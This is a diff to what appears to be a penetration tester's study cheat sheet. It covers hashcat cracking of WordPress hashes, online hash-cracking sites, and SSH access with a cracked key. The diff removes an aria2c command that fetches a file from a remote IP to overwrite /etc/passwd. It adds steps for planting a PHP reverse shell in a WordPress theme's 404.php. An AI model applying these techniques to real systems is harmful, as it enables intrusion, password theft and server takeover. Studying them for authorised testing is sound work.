@@ -1479,7 +1479,7 @@ hashcat -m 400 'hash$'/home/kali/Documents/crack/rockyou.txt  // Wordpress
 Online crackers
 
 ```
-https://hashkiller.co.uk/Cracker
+https://md5hashing.net/hash/md5
 https://www.cmd5.org/
 https://www.onlinehashcrack.com/
 https://gpuhash.me/
@@ -3011,11 +3011,17 @@ Connect up like so: ssh -i id_rsa daniela@192.168.50.244
 	Enter in the password found from john. id_rsa is required to be specified during connection
 
  
-  # Aria2c
+  # Wordpress
 
-  Summary: Network Downloader tools with the SUID root bit set can be used to overwrite files, such as /etc/passwd or /root/.ssh/id_rsa
-
-  /usr/bin/aria2c -d /etc -o passwd "http://192.168.45.182:80/etc_passwd.txt" --allow-overwrite=true
+ 	Reverse Shell Via Theme Editor: 
+		1) On the WordPress dashboard, click on Appearance → Themes → Theme File Editor
+		2) On the right-hand side panel, select the 404.php file.
+		3) Modify php-reverse-shell.php to be your LPORT and LHOST
+  		4) Copy-and-paste all of the php code to go inside the 404.php
+    		5) click update
+      		6) start up listener
+      		6) Open up the 404.php file inside of the theme's directory
+  
 
   # Exploiting Wildcards With Sudo Permissions
 
